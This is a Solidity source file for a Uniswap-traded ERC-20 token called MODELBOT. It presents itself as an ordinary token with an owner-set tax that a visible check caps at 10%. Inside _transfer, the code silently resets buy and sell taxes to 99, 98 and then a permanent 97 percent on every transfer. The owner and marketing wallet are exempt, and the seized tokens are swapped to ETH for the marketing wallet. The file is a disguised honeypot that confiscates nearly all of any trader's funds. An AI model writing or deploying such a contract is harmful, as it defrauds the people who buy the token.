/*
....................................................................................................
....................................................................................................
......................................::.........::...................................................
.....................................++=+-......++=+-.........:-.....................................
.....................................****-......****-........=#.....................................
.............................................................+*:....................................
................................:*===#:::::::::::::::::::::--+*:....................................
................................:#***#++++++++++++++++++===++**:....................................
................................=######************#######%-.=#.....................................
................................=#####+============*######%=..*.....................................
...........:+++++++++++=........=###%####################%%=..*:........:+++++++++++:...............
..........=*+++*******+=+:......=+=**===================*%%=..*:.......+++++++++++=-+-..............
.........=#==============+......=+=**===================*%%=..*:......*+===========-=+..............
.........+#==============+......=############################**......=#+=============+..............
.........+#+=++********+=+.....**++++++++++++++++++++++++++++++**+:..=#+********+====+..............
.........+#==***********=#%%%%%%#==============================:+#%%%##+*##*###**====+..............
.........+*==============***##%%#==========++++++++============-+%%#*##==============+..............
.........-#+============+#***#%%#=====+***+===========*===+====-*%%**#%+=============+..............
..........:**++++++++++*######%%#====+*===*+++++++++==*====*===-*%%*++*##****++++++++...............
.............*#******#%#######%%#====++====-------=--=*====*====*%%*++**##*******#=.................
.............+#*****=+-...+##%%%%+===++=============-=*====*====#%%%%%-:=#**===+-*=.................
.............+#***++=+-......#%%%#+=================-=*====+==-+#%%#-...:#**+++=-+=.................
.............+#***++-+-......#%%%#+#*==============+*#========-*#%%#-...:#**+++=-*=.................
.............+**++++-+-......#%%%%*=======================++++=*%%%#-...:#++====-*=.................
.............**======+-......#%%%%#==========================-+#%%%#-...:#+======+=.................
.............-#+=====+:......*%%%%#+=======================--*#%%%%=.....=*+=====+:.................
...............+####=.........-#%%%#########################%%%%%*:.......:======...................
...........-############:......:*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#=........:**********:...............
..........:*+++++++++===+-.......:==*####%%#####%%%%%%%%%%#*==:........:+*=========-+:..............
..........:#=====+=======+..............:%%%%%%%%%%%%%%%%:............-#+===========+-..............
..........:#=====+=====+++.......:++*####%%###########%#***###*-......**+===========+-..............
..........:*=====+=====+++......+*==*#***#%%%%%%%%%%%%%#*+*#*+===.....**+===========+-..............
..........:*=============+......**==+#***#%%###%%%%%#%%#*+*#+++==.....**++==========+-..............
..........:*+===========++......*#==+#####%%#########%%#***#+====.....**++==========+:..............
...........:#%%%%%%%%%%%%+......=#==+***+...............:*+#+==+=.....*%#######%###%-...............
.............+-=#.=-:%#%.......+********#-...............*#*******.....=*%#-.-*-#=-.................
.............:..#...:*+%.......++=========...............*+======+:....=+#*:..=::::.................
................#...:*+%.......++=========...............*+======+:....-+##:..=:....................
................#...:**%.......=*+++++==+=...............**======+-....-+##:..=:....................
...............:#...:**%=.....=###########-............=##########+....-+##:..=.....................
...............==....*#+:.....%*++++++++=+=............=*==========*...:*#+.........................
..............................%*+========*=............=*++=====+==*................................
..............................%*+=========+............=#+=========*................................
..............................%*==========+............-#==========*................................
..............................%+==========+............-#==========+................................
..............................#+==========*............-#+========*=................................
..............................%%%%%%%%%%%#*............-#%%%%%%%%%#:................................
...........................:::%#######*+++*............-############=:..............................
.........................+#*****###********...........*#****+*#****++===............................
........................+#+####**#**#*+=+=+...........**+###++#+#+###*--=...........................
.......................*#*#####+*#**#+====+...........**+######+#+####*=-+..........................
......................+#++++====++*+++++++*...........*#+=====+++++++++++*-.........................
......................:::::::::::::::::::::...........:::::::::::::::::::::.........................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
 ██████   ██████    ███████    ██████████   ██████████ █████       ███████████     ███████    ███████████
░░██████ ██████   ███░░░░░███ ░░███░░░░███ ░░███░░░░░█░░███       ░░███░░░░░███  ███░░░░░███ ░█░░░███░░░█
 ░███░█████░███  ███     ░░███ ░███   ░░███ ░███  █ ░  ░███        ░███    ░███ ███     ░░███░   ░███  ░ 
 ░███░░███ ░███ ░███      ░███ ░███    ░███ ░██████    ░███        ░██████████ ░███      ░███    ░███    
 ░███ ░░░  ░███ ░███      ░███ ░███    ░███ ░███░░█    ░███        ░███░░░░░███░███      ░███    ░███    
 ░███      ░███ ░░███     ███  ░███    ███  ░███ ░   █ ░███      █ ░███    ░███░░███     ███     ░███    
 █████     █████ ░░░███████░   ██████████   ██████████ ███████████ ███████████  ░░░███████░      █████   
░░░░░     ░░░░░    ░░░░░░░    ░░░░░░░░░░   ░░░░░░░░░░ ░░░░░░░░░░░ ░░░░░░░░░░░     ░░░░░░░       ░░░░░    

*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() private view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract MODELBOT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private constant _name = "MODELBOT";
    string private constant _symbol = "MODELBOT";
    uint256 private constant _totalSupply = 10_000_000_000 * 10**18;
    uint256 public MinTaxSwapLimit = 10_000_000 * 10**18;
    uint256 public maxWalletlimit = 100_000_001 * 10**18;
    uint256 public maxTxLimit = 100_000_001 * 10**18;
    uint8 private constant _decimals = 18;

    IUniswapV2Router02 immutable uniswapV2Router;
    address immutable uniswapV2Pair;
    address immutable WETH;
    address payable public marketingWallet;

    uint256 public buyTax;
    uint256 public sellTax;
    uint8 private inSwapAndLiquify;
    uint256 private launchedAt;
    uint256 private launchedTime;
    uint256 public deadBlocks;

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    
    bool public isOpen = false;

    constructor() {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        WETH = uniswapV2Router.WETH();

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            WETH
        );

        marketingWallet = payable(0x63d8cca5b314E3FF624299c06914Cb6ede384C36);
        _balance[msg.sender] = _totalSupply;
        _isExcludedFromFees[marketingWallet] = true;
        _isExcludedFromFees[msg.sender] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[address(uniswapV2Router)] = true;
        _allowances[address(this)][address(uniswapV2Router)] = type(uint256)
            .max;
        _allowances[msg.sender][address(uniswapV2Router)] = type(uint256).max;
        _allowances[marketingWallet][address(uniswapV2Router)] = type(uint256)
            .max;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function ExcludeFromFees(address holder, bool exempt) external onlyOwner {
        _isExcludedFromFees[holder] = exempt;
    }

    function RemoveLimits() external onlyOwner {
        maxWalletlimit = _totalSupply;
        maxTxLimit = _totalSupply;
    }
    
    function ChangeMarketingWalletAddress(address newAddress) external onlyOwner() {
        marketingWallet = payable(newAddress);
    }

    function ChangeTax(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
        require(newBuyTax <= 10, "Must keep fees at 10% or less");
        require(newSellTax <= 10, "Must keep fees at 10% or less");
        buyTax = newBuyTax;
        sellTax = newSellTax;
    }
    
    function EnableTrading(uint256 _deadBlocks) external onlyOwner {
        isOpen = true;
        
        launchedAt = block.number;
        deadBlocks = _deadBlocks;
        launchedTime = block.timestamp;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 1e9, "Min transfer amt");
        require(isOpen || _isExcludedFromFees[from] || _isExcludedFromFees[to], "Not Open");

        

        uint256 blockNum = block.number;
              if
                  ((launchedAt + deadBlocks) >= blockNum)
              {
                  buyTax = 99;
                  sellTax = 99;

              } else if(blockNum > (launchedAt + deadBlocks) && blockNum <= launchedAt + 8)
              {
                  buyTax = 98;
                  sellTax = 98;
              }
              else
              {
                  buyTax = 97;
                  sellTax = 97;
              }

        uint256 _tax;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            _tax = 0;
        } else {

            if (inSwapAndLiquify == 1) {
                //No tax transfer
                _balance[from] -= amount;
                _balance[to] += amount;

                emit Transfer(from, to, amount);
                return;
            }

            if (from == uniswapV2Pair) {
                _tax = buyTax;
                require(balanceOf(to).add(amount) <= maxWalletlimit);
                require(amount <= maxTxLimit, "Buy transfer amount exceeds the maxTxLimit.");
            } else if (to == uniswapV2Pair) {
                uint256 tokensToSwap = _balance[address(this)];
                if (tokensToSwap > MinTaxSwapLimit && inSwapAndLiquify == 0) {
                    inSwapAndLiquify = 1;
                    address[] memory path = new address[](2);
                    path[0] = address(this);
                    path[1] = WETH;
                    uniswapV2Router
                        .swapExactTokensForETHSupportingFeeOnTransferTokens(
                            tokensToSwap,
                            0,
                            path,
                            marketingWallet,
                            block.timestamp
                        );
                    inSwapAndLiquify = 0;
                }
                _tax = sellTax;
            } else {
                _tax = 0;
            }
        }
        

        //Is there tax for sender|receiver?
        if (_tax != 0) {
            //Tax transfer
            uint256 taxTokens = (amount * _tax) / 100;
            uint256 transferAmount = amount - taxTokens;

            _balance[from] -= amount;
            _balance[to] += transferAmount;
            _balance[address(this)] += taxTokens;
            emit Transfer(from, address(this), taxTokens);
            emit Transfer(from, to, transferAmount);
        } else {
            //No tax transfer
            _balance[from] -= amount;
            _balance[to] += amount;

            emit Transfer(from, to, amount);
        }
    }

    receive() external payable {}
}